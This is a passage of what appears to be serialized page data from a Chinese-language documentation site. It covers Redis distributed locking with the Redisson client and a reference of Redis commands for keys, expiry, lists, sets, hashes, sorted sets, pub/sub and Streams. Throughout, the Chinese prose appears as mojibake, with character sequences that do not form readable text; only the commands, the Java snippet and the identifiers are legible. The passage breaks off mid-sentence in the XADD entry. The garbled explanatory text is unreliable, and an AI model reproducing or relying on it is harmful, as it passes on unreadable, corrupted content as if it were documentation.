æ¯ä¸ä¸ªä¼ä¸çº§çå¼æº redis clientï¼ä¹æä¾äºåå¸å¼éçæ¯æãæä¹éå¸¸æ¨èå¤§å®¶ä½¿ç¨ï¼ä¸ºä»ä¹å¢ï¼\n\nåæ³ä¸ä¸ä¸é¢è¯´çï¼å¦æèªå·±åä»£ç æ¥éè¿ redis è®¾ç½®ä¸ä¸ªå¼ï¼æ¯éè¿ä¸é¢è¿ä¸ªå½ä»¤è®¾ç½®çã\n\nset anylock unique_value nx px 30000\n\n\n1\n\n\nè¿éè®¾ç½®çè¶æ¶æ¶é´æ¯ 30sï¼åå¦æè¶è¿ 30s é½è¿æ²¡æå®æä¸å¡é»è¾çæåµä¸ï¼key ä¼è¿æï¼å¶ä»çº¿ç¨æå¯è½ä¼è·åå°éã\n\nè¿æ ·ä¸æ¥çè¯ï¼ç¬¬ä¸ä¸ªçº¿ç¨è¿æ²¡æ§è¡å®ä¸å¡é»è¾ï¼ç¬¬äºä¸ªçº¿ç¨è¿æ¥äºä¹ä¼åºç°çº¿ç¨å®å¨é®é¢ãæä»¥æä»¬è¿éè¦é¢å¤çå»ç»´æ¤è¿ä¸ªè¿ææ¶é´ï¼å¤ªéº»ç¦äºï½\n\næä»¬æ¥çç redisson æ¯æä¹å®ç°çï¼åæåä¸ä¸ä½¿ç¨ redission çç½ï¼\n\nconfig config = new config();\nconfig.useclusterservers()\n.addnodeaddress("redis://192.168.31.101:7001")\n.addnodeaddress("redis://192.168.31.101:7002")\n.addnodeaddress("redis://192.168.31.101:7003")\n.addnodeaddress("redis://192.168.31.102:7001")\n.addnodeaddress("redis://192.168.31.102:7002")\n.addnodeaddress("redis://192.168.31.102:7003");\n\nredissonclient redisson = redisson.create(config);\n\n\nrlock lock = redisson.getlock("anylock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°±æ¯è¿ä¹ç®åï¼æä»¬åªéè¦éè¿å®ç api ä¸­ç lock å unlock å³å¯å®æåå¸å¼éï¼ä»å¸®æä»¬èèäºå¾å¤ç»èï¼\n\n * redisson æææä»¤é½éè¿ lua èæ¬æ§è¡ï¼redis æ¯æ lua èæ¬åå­æ§æ§è¡\n * redisson è®¾ç½®ä¸ä¸ª key çé»è®¤è¿ææ¶é´ä¸º 30s, å¦ææä¸ªå®¢æ·ç«¯ææä¸ä¸ªéè¶è¿äº 30s æä¹åï¼\n   redisson ä¸­æä¸ä¸ª watchdog çæ¦å¿µï¼ç¿»è¯è¿æ¥å°±æ¯çé¨çï¼å®ä¼å¨ä½ è·åéä¹åï¼æ¯é 10 ç§å¸®ä½ æ key çè¶æ¶æ¶é´è®¾ä¸º 30s\n   è¿æ ·çè¯ï¼å°±ç®ä¸ç´ææéä¹ä¸ä¼åºç° key è¿æäºï¼å¶ä»çº¿ç¨è·åå°éçé®é¢äºã\n * redisson ç âçé¨çâ é»è¾ä¿è¯äºæ²¡ææ­»éåçã\n   å¦ææºå¨å®æºäºï¼çé¨çä¹å°±æ²¡äºãæ­¤æ¶å°±ä¸ä¼å»¶é¿ key çè¿ææ¶é´ï¼å°äº 30s ä¹åå°±ä¼èªå¨è¿æäºï¼å¶ä»çº¿ç¨å¯ä»¥è·åå°é)\n\n\n# å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼\n\n * å®è·åéçæ¹å¼ç®åç²æ´ï¼è·åä¸å°éç´æ¥ä¸æ­å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n * å¦å¤æ¥è¯´çè¯ï¼redis çè®¾è®¡å®ä½å³å®äºå®çæ°æ®å¹¶ä¸æ¯å¼ºä¸è´æ§ç (redis ä¸ç´æ§é®é¢çè¿é)ï¼å¨æäºæç«¯æåµä¸ï¼å¯è½ä¼åºç°é®é¢ãéçæ¨¡åä¸å¤å¥å£®\n * å³ä¾¿ä½¿ç¨ redlock ç®æ³æ¥å®ç°ï¼å¨æäºå¤æåºæ¯ä¸ï¼ä¹æ æ³ä¿è¯å¶å®ç° 100% æ²¡æé®é¢ï¼å³äº redlock çè®¨è®ºå¯ä»¥ç how to do distributed locking\n * redis åå¸å¼éï¼å¶å®éè¦èªå·±ä¸æ­å»å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n\nä½æ¯å¦ä¸æ¹é¢ä½¿ç¨ redis å®ç°åå¸å¼éå¨å¾å¤ä¼ä¸ä¸­éå¸¸å¸¸è§ï¼èä¸å¤§é¨åæåµä¸é½ä¸ä¼éå°æè°ç âæç«¯å¤æåºæ¯â\n\næä»¥ä½¿ç¨ redis ä½ä¸ºåå¸å¼éä¹ä¸å¤±ä¸ºä¸ç§å¥½çæ¹æ¡ï¼æéè¦çä¸ç¹æ¯ redis çæ§è½å¾é«ï¼å¯ä»¥æ¯æé«å¹¶åçè·åãéæ¾éæä½ã\n\nspring boot æ´å redisson çä¸¤ç§æ¹å¼ï¼\nèªå·±éç½®æ¹å¼ï¼https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter æ¹å¼ï¼https://blog.csdn.net/a1058926697/article/details/116670391',charsets:{cjk:!0}},{title:"Rediså½ä»¤ä»ç»",frontmatter:{title:"Rediså½ä»¤ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1601.Redis%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1601.Rediså½ä»¤ä»ç».md",key:"v-3d481430",path:"/redis/1601/",headers:[{level:2,title:"å¬ç¨å½ä»¤",slug:"å¬ç¨å½ä»¤",normalizedTitle:"å¬ç¨å½ä»¤",charIndex:2},{level:2,title:"å¤çæ¶é´",slug:"å¤çæ¶é´",normalizedTitle:"å¤çæ¶é´",charIndex:384},{level:2,title:"èªå¢åèªå",slug:"èªå¢åèªå",normalizedTitle:"èªå¢åèªå",charIndex:776},{level:2,title:"å­ç¬¦ä¸² String",slug:"å­ç¬¦ä¸²-string",normalizedTitle:"å­ç¬¦ä¸² string",charIndex:1002},{level:2,title:"åè¡¨ list",slug:"åè¡¨-list",normalizedTitle:"åè¡¨ list",charIndex:1660},{level:2,title:"éå set",slug:"éå-set",normalizedTitle:"éå set",charIndex:3448},{level:2,title:"æ£å hash åå¸ç±»å",slug:"æ£å-hash-åå¸ç±»å",normalizedTitle:"æ£å hash åå¸ç±»å",charIndex:4473},{level:2,title:"æåºéå zset",slug:"æåºéå-zset",normalizedTitle:"æåºéå zset",charIndex:5078},{level:2,title:"è®¢é/åå¸",slug:"è®¢é-åå¸",normalizedTitle:"è®¢é / åå¸",charIndex:6386},{level:2,title:"Redis5 ä¹ Streams æ°æ®ç±»å",slug:"redis5-ä¹-streams-æ°æ®ç±»å",normalizedTitle:"redis5 ä¹ streams æ°æ®ç±»å",charIndex:6673},{level:3,title:"streamsæ°æ®ç»æ",slug:"streamsæ°æ®ç»æ",normalizedTitle:"streams æ°æ®ç»æ",charIndex:7170},{level:3,title:"streamsåºç¡",slug:"streamsåºç¡",normalizedTitle:"streams åºç¡",charIndex:7409},{level:3,title:"streamså½ä»¤",slug:"streamså½ä»¤",normalizedTitle:"streams å½ä»¤",charIndex:7646},{level:3,title:"streamsä¸ç§æ¥è¯¢æ¨¡å¼",slug:"streamsä¸ç§æ¥è¯¢æ¨¡å¼",normalizedTitle:"streams ä¸ç§æ¥è¯¢æ¨¡å¼",charIndex:9790}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"å¬ç¨å½ä»¤ å¤çæ¶é´ èªå¢åèªå å­ç¬¦ä¸² String åè¡¨ list éå set æ£å hash åå¸ç±»å æåºéå zset è®¢é/åå¸ Redis5 ä¹ Streams æ°æ®ç±»å streamsæ°æ®ç»æ streamsåºç¡ streamså½ä»¤ streamsä¸ç§æ¥è¯¢æ¨¡å¼",content:'# å¬ç¨å½ä»¤\n\nå¯ä»¥å é¤ä»»ææ°æ®ç»æç key\n\ndel key \n\n\n1\n\n\næ¥çææ key\n\nkeys *\n\n\n1\n\n\næ ¹æ®ç»å®çéé¡¹ï¼å¯¹è¾å¥åè¡¨ãéåæèæåºéåè¿è¡æåºï¼ç¶åè¿åæèå­å¨æåºçç»æã\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\næ¥çæ°æ®åºæå¤å°ä¸ª key\n\ndbsize\n\n\n1\n\n\næ¸é¤ææåºçæ°æ®\n\nflushall\n\n\n1\n\n\næ¸é¤å½ååºçæææ°æ®\n\nflushdb\n\n\n1\n\n\næ¥ç reids åå­ä¿¡æ¯ç­\n\ninfo\n\n\n1\n\n\nçæ§ææå®¢æ·åéçå½ä»¤ï¼redis ç¼è¯æ§è¡æåçå½ä»¤ï¼\n\nmonitor\n\n\n1\n\n\n\n# å¤çæ¶é´\n\nç§»é¤é®çè¿ææ¶é´\n\npersist key \n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿æè¿æå¤å°ç§\n\nttl key \n\n\n1\n\n\nç»å®é®å¨æå®çç§æ°åè¿æ\n\nexpire key seconds \n\n\n1\n\n\nå°ç»å®é®çè¿ææ¶é´è®¾ç½®ä¸ºç»å®ç unix æ¶é´æ³\n\nexpireat key timestamp\n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿ææ¶é´è¿æå¤å°æ¯«ç§ï¼è¿ä¸ªå½ä»¤å¨ reids2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npttl key \n\n\n1\n\n\nè®©ç»å®é®å¨æå®çæ¯«ç§æ°ä¹åè¿æï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpire key milliseconds \n\n\n1\n\n\nå°ä¸ä¸ªæ¯«ç§çº§ç²¾åº¦ç unix æ¶é´æ³è®¾ç½®ä¸ºç»å®é®çè¿ææ¶é´ï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# èªå¢åèªå\n\nå°é®å­å¨çå¼ + 1\n\nincr key \n\n\n1\n\n\nå°é®å­å¨çå¼ - 1\n\ndecr key \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æ´æ° amount\n\nincrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼åå»æ´æ° amount\n\ndecrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æµ®ç¹æ° amountï¼è¿ä¸ªå½ä»¤å¨ Redis2.6 ä»¥ä¸çæ¬å¯ç¨\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# å­ç¬¦ä¸² String\n\nå¯ä»¥æ¯å­ç¬¦ä¸²ï¼ç®åçå­ç¬¦ä¸²ãå¤æçå­ç¬¦ä¸²ï¼ä¾å¦ JSONãXMLï¼ï¼ãæ°å­ï¼æ´æ°ãæµ®ç¹æ°ï¼ï¼çè³æ¯äºè¿å¶ï¼å¾çãé³é¢ãè§é¢ï¼ï¼ä½æ¯å¼æå¤§ä¸è½è¶è¿ 512MB\n\nåå»ºä¸ä¸ªé®å¼å¯¹ set key value\n\n127.0.0.1:6379> set a 1234567890\nOK\n\n\n1\n2\n\n\nè·å key å­å¨çå¼ get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\nå°å¼ value è¿½å å°ç»å® key å½åå­å¨çå¼çæ«å°¾ï¼è¿½å æåçåè¿åå¼ä¸ºè¿ä¸ªå­ç¬¦ä¸²çé¿åº¦ (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\nè·åä¸ä¸ªç±åç§»é start è³ end èå´åçææå­ç¬¦ç»æçå­ä¸²ï¼åæ¬ start å end å¨åãgetrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\nå°ä» start åç§»éå¼å§çå­ä¸²è®¾ç½®ä¸ºç»å®å¼ setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# åè¡¨ list\n\nç¨æ¥å­å¨å¤ä¸ªæåºçå­ç¬¦ä¸²ï¼åè¡¨ä¸­çæ¯ä¸ªå­ç¬¦ä¸²ç§°ä¸ºåç´ ï¼elementï¼ï¼ä¸ä¸ªåè¡¨æå¤å¯ä»¥å­å¨ 2^32 -1 ä¸ªåç´ \n\nå°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå³ç«¯ rpush key value [...]\n\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> RPUSH b 7 8\n(integer) 4\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè·å list åç´ æ°é llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> å°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå·¦ç«¯\n\n127.0.0.1:6379> LPUSH b 1 2\n(integer) 6\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> ç§»é¤å¹¶è¿ååè¡¨æå³ç«¯çåç´ \n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> ç§»é¤å¹¶è¿ååè¡¨æå·¦ç«¯çåç´ \n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> è¿ååè¡¨ä¸­åç§»éä¸º offset çåç´  (ä¸æ ä» 0 å¼å§)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> è¿ååè¡¨ä» start åç§»éå° end åç§»éèå´çææåç´ ãåå« start å end æ¬èº«ãlrange key 0 -1 ä¸ºæ¥è¯¢ææ\n\n127.0.0.1:6379> LRANGE b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> å¯¹åè¡¨è¿è¡ä¿®é®ï¼åªä¿çä» start è³ end åç§»éçåç´ ï¼åå« start å endã\n\n127.0.0.1:6379> LTRIM b 1 2\nOK\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå·¦ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> BLPOP c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ \n\nbrpoplpush source-key dest-key timeout -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ ï¼å¦æ source-key ä¸ºç©ºï¼é£ä¹å¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç°ã\n\n\n# éå set\n\nç¨æ¥ä¿å­å¤ä¸ªçå­ç¬¦ä¸²åç´ ï¼ä½ååè¡¨ç±»åä¸ä¸æ ·çæ¯ï¼éåä¸­ä¸åè®¸æéå¤åç´ ï¼å¹¶ä¸éåä¸­çåç´ æ¯æ åºçï¼ä¸è½éè¿ç´¢å¼ä¸æ è·ååç´ \n\nsadd key item[...] -> å°ä¸ä¸ªæå¤ä¸ªåç´ æ·»å å°éåéé¢ï¼å¹¶è¿åè¢«æ·»å åç´ å½ä¸­åæ¬å¹¶ä¸å­å¨äºéåéé¢çåç´ æ°éã\n\nsrem key item[...] -> ä»éåéé¢å é¤ä¸ä¸ªæå¤ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤åç´ çæ°éã\n\nsismember key item -> æ£æ¥åç´ itemæ¯å¦å­å¨äºéåkeyéé¢ã\n\nscard key -> è¿åéååå«çåç´ æ°éã\n\nsmembers key -> è¿åéååå«çææåç´ ã\n\nsrandmember key [count] -> ä»éåééæºçè¿åä¸ä¸ªæå¤ä¸ªåç´ ï¼å½count ä¸ºæ­£æ´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ ä¸ä¼éå¤ï¼å½countä¸ºè´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ å¯è½ä¼åºç°éå¤ã\n\nspop key -> éæºçç§»é¤éåä¸­çä¸ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤çåç´ ã\n\nsmove source-key dest-key item -> å¦æéåsource-keyåå«åç´ itemï¼é£ä¹ä»éåsource-key éé¢ç§»é¤yåç´ itemï¼å¹¶å°åç´ itemæ·»å å°éådest-keyä¸­ï¼å¦æitemæåç§»é¤ï¼é£ä¹å½ä»¤è¿å1ï¼å¦åè¿å0ï¼\n\nsdiff key[...] -> è¿åé£äºå­å¨äºç¬¬ä¸ä¸ªéåãä½ä¸å­å¨äºå¶ä»éåä¸­çåç´ (æ°å­¦ä¸çå·®éè¿ç®)\n\nsdiffstore dest-key key[...] -> å°é£äºå­å¨äºç¬¬ä¸ä¸ªéåä½ä¸å­å¨äºå¶ä»éåçåç´ (æ°å­¦ä¸çå·®éè¿ç®)å­å¨å°dest-key é®éé¢\n\nsinter key[...] -> è¿åé£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)\n\nsinter dest-key key[...] -> é£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\nsunion key[...] -> è¿åé£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)\n\nsunionstore dest-key key[...] -> é£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# æ£å hash åå¸ç±»å\n\n\nhset key-name key value -> åå»ºä¸ä¸ªæ£åå¹¶èµå¼\n\nhget key-name key -> è¿åæå®æ£åé®çå¼\n\nhgetall key-name -> è·åæ£ååå«çææé®å¼å¯¹\n\nhmset key-name key value[key value ...] -> ä¸ºæ£åéé¢çä¸ä¸ªæå¤ä¸ªé®è®¾ç½®å¼\n\nhmget key-name key[...] -> ä»æ£åéé¢è·åä¸ä¸ªæå¤ä¸ªé®çå¼\n\nhlen key-name -> è¿åæ£ååå«çé®å¼å¯¹æ°é\n\nhdel key-name key[...] -> å é¤æ£åéé¢çä¸ä¸ªæå¤ä¸ªé®å¼å¯¹ï¼è¿åæåæ¾å°å¹¶å é¤çé®å¼å¯¹æ°éã\n\nhexists key-name key -> æ£æ¥ç»å®çé®æ¯å¦å­å¨äºæ£åä¸­\n\nhkeys key-name -> è·åæ£ååå«çææé®\n\nhvals key-name -> è·åæ£ååå«çææå¼\n\nhincrby key-name key increment -> å°é®keyå­å¨çå¼å ä¸æ´æ°increment\n\nhincrbyfloat key-name key increment -> å°é®keyå­å¨çå¼å ä¸æµ®ç¹æ°increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æåºéå zset\n\nä¸è½æéå¤çåç´ ï¼èä¸è¿å¯ä»¥æåºï¼å®ååè¡¨ä½¿ç¨ç´¢å¼ä¸æ ä½ä¸ºæåºä¾æ®ä¸åçæ¯ï¼å®ç»æ¯ä¸ªåç´ è®¾ç½®ä¸ä¸ªåæ° (score) ä½ä¸ºæåºçä¾æ®ï¼é»è®¤ååºï¼\n\n\nzadd key score member [score member ...] -> å°å¸¦æç»å®åå¼çæåæ·»å å°æåºéåéé¢\n\nzrem key member[...] -> ä»æåºéåéé¢ç§»é¤ç»å®çæåï¼å¹¶è¿åè¢«ç§»é¤æåçæ°é\n\nzcard key -> è¿åæåºéååå«çæåæ°é\n\nzincrby key increment member -> å°memberæåçåå¼å ä¸increment\n\nzcount key min max -> è¿ååå¼ä»äºmin åmax ä¹é´çæåæ°é\n\nzrank key member -> è¿åæåmemberå¨æåºéåä¸­çæå\n\nzscore key member -> è¿åæåmemberçåå¼\n\nzrange key start stop [withscores] -> è¿åæåºéåä¸­æåä»äºstart å stop ä¹é´çæåï¼å¦æç»å®äºå¯éç withscores éé¡¹ï¼é£ä¹ä¼å°æåçåå¼ä¸å¹¶è¿åãzrange key 0 -1 æ¥è¯¢æææå\n\nzrevrank key member -> è¿åæåºéåéæåmemberçæåï¼æåæç§åå¼ä»å¤§å°å°æå\n\nzrevrange key start stop [withscores] -> è¿åæåºéåç»å®æåèå´åçæåï¼æç§åå¼ä»å¤§å°å°æå\n\nzrangebyscore key min max [withscores] [left offset count] -> è¿åæåºéåä¸­ï¼åå¼ä»äºminåmaxä¹é´çæææå\n\nzrevrangebyscore key max min [withscores] [left offset count] -> è·åæåºéåä¸­åå¼ä»äºminåmaxä¹é´çæææåï¼å¹¶æç§åå¼ä»å¤§å°å°çé¡ºåºæ¥è¿åä»ä»¬ã\n\nzremrangebyrank key start top -> ç§»é¤æåºéåä¸­æåä»äºstart å stop ä¹é´çæåã\n\nzremrangebyscore key min max -> ç§»é¤æåºéåä¸­åå¼ä»äºminåmax ä¹é´çæåã\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹ç»å®çæåºéåæ§è¡ç±»ä¼¼äºéåçäº¤éè¿ç®\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹æå®çæåºéåæ§è¡ç±»ä¼¼äºéåçå¹¶éè¿ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è®¢é / åå¸\n\n\nsubscribe channel[...] -> è®¢éç»å®çä¸ä¸ªæå¤ä¸ªé¢é\n\nunsubscribe channel[...] -> éè®¢ç»å®çä¸ä¸ªæå¤ä¸ªé¢éï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½é¢éï¼é£ä¹éè®¢ææé¢é\n\npublish channel message -> åç»å®çé¢éåéæ¶æ¯\n\npsubscribe pattern[...] -> è®¢éä¸ç»å®æ¨¡å¼ç¸å¹éçææé¢é\n\npunsubscribe pattern[...] -> éè®¢ç»å®çæ¨¡å¼ï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½æ¨¡å¼ï¼é£ä¹éè®¢æææ¨¡å¼ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# Redis5 ä¹ Streams æ°æ®ç±»å\n\nRedis 5.0 å¨æ°çæ°æ®ç±»åï¼streamsï¼å®æ¹æå®å®ä¹ä¸ºï¼ä»¥æ´æ½è±¡çæ¹å¼å»ºæ¨¡æ¥å¿çæ°æ®ç»æãRedis ç streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼è³å°å¨æ¦å¿µä¸å®æ¯ä¸ç§å¨åå­ä¸­è¡¨ç¤ºçæ½è±¡æ°æ®ç±»åï¼åªä¸è¿å®ä»¬å®ç°äºæ´å¼ºå¤§çæä½ï¼ä»¥åææ¥å¿æä»¶æ¬èº«çéå¶ã\n\nå¦æä½ äºè§£ MQï¼é£ä¹å¯ä»¥æ streams å½å MQãå¦æä½ è¿äºè§£ kafkaï¼é£ä¹çè³å¯ä»¥æ streams å½å kafkaã\n\nå¦å¤ï¼è¿ä¸ªåè½æç¹ç±»ä¼¼äº redis ä»¥åç Pub/Subï¼ä½æ¯ä¹æåºæ¬çä¸åï¼\n\n * streams æ¯æå¤ä¸ªå®¢æ·ç«¯ï¼æ¶è´¹èï¼ç­å¾æ°æ®ï¼Linux ç¯å¢å¼å¤ä¸ªçªå£æ§è¡ XREAD å³å¯æ¨¡æï¼ï¼å¹¶ä¸æ¯ä¸ªå®¢æ·ç«¯å¾å°çæ¯å®å¨ç¸åçæ°æ®ã\n\n * Pub/Sub æ¯åéå¿è®°çæ¹å¼ï¼å¹¶ä¸ä¸å­å¨ä»»ä½æ°æ®ï¼è streams æ¨¡å¼ä¸ï¼æææ¶æ¯è¢«æ éæè¿½å å¨ streams ä¸­ï¼é¤éç¨äºæ¾ç¤ºæ§è¡å é¤ï¼XDELï¼ã\n\n * streams ç Consumer Groups ä¹æ¯ Pub/Sub æ æ³å®ç°çæ§å¶æ¹å¼ã\n\n\n# streams æ°æ®ç»æ\n\nstreams æ°æ®ç»ææ¬èº«éå¸¸ç®åï¼ä½æ¯ streams ä¾ç¶æ¯ Redis å°ç®åä¸ºæ­¢æå¤æçç±»åï¼å¶åå æ¯å®ç°çä¸äºé¢å¤çåè½ï¼ä¸ç³»åçé»å¡æä½åè®¸æ¶è´¹èç­å¾çäº§èå å¥å° streams çæ°æ°æ®ãå¦å¤è¿æä¸ä¸ªç§°ä¸º Consumer Groups (æ¶è´¹ç») çæ¦å¿µï¼è¿ä¸ªæ¦å¿µæåç± kafka æåºï¼Redis æä¸ä¸ªç±»ä¼¼å®ç°ï¼å kafka ç Consumer Groups çç®çæ¯ä¸æ ·çï¼åè®¸ä¸ç»å®¢æ·ç«¯åè°æ¶è´¹ç¸åçä¿¡æ¯æµï¼\n\n\n# streams åºç¡\n\nä¸ºäºçè§£ streams çç®çï¼ä»¥åå¦ä½ä½¿ç¨å®ï¼æä»¬åå¿½ç¥æææé«çº§ç¹æ§ï¼åªææ³¨æåæ¾å¨æ°æ®ç»ææ¬èº«ï¼ä»¥åé£äºæä½åè®¿é® streams çå½ä»¤ãè¿åºæ¬ä¸ä¹æ¯å¤§å¤æ°å¶ä» Redis æ°æ®ç±»åå±æçé¨åï¼ä¾å¦ Listsï¼Setsï¼Sorted Sets ç­ãç¶èéè¦æ³¨æçæ¯ï¼Lists ä¹æä¸ä¸ªæ´å¤æçé»å¡å¼ç APIï¼ä¾å¦ BLPOPï¼BRPOP ç­ãstreams è¿æ¹ä¾¿ç API ä¹æ²¡ä»ä¹ä¸åï¼åªæ¯æ´å¤æï¼æ´å¼ºå¤§ï¼æ´çé¼ï¼åï¼ï¼\n\n\n# streams å½ä»¤\n\nåºè¯ä¸å¤è¯´ï¼åä¸æç©ç©è¿ä¸ªå¨æ°çæ°æ®ç±»åãstreams è¿ä¸ªæ°æ®ç±»åå¯¹åºæå¦ä¸ 13 ä¸ªæä½å½ä»¤ï¼ææå½ä»¤é½ä»¥ "X" å¼å¤´ï¼\nXADD\n\n * ç¨æ³ï¼XADD key ID field string [field string â¦]\n\n * æ­£å¦å¶åï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥æ·»å çï¼ç» streams è¿½å ï¼appendï¼åé¢æå°è¿ï¼streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼ä¸ä¸ªæ°ç entryï¼å Java éç Map ç±»ä¼¼ï¼Redis éç streams ä¸­çæ°æ®ä¹ç§°ä¸º entryï¼ã\n\n * keyï¼çå«ä¹å°±æ¯åä¸ç±»å streams çåç§°ï¼\n\n * ID: streams ä¸­ entry çå¯ä¸æ è¯ç¬¦ï¼å¦ææ§è¡ XADD å½ä»¤æ¶ï¼ä¼ å¥æå·ï¼*ï¼ï¼é£ä¹ï¼ID ä¼èªå¨çæï¼ä¸èªå¨çæç ID ä¼å¨æ§è¡ XADD åè¿åï¼é»è®¤çæç ID æ ¼å¼ä¸º millisecondsTime+sequenceNumberï¼å³å½åæ¯«ç§çº§å«çæ¶é´æ³å ä¸ä¸ä¸ªèªå¢åºå·å¼ï¼ä¾å¦ "1540013735401-0"ãå¹¶ä¸æ§è¡ XADD 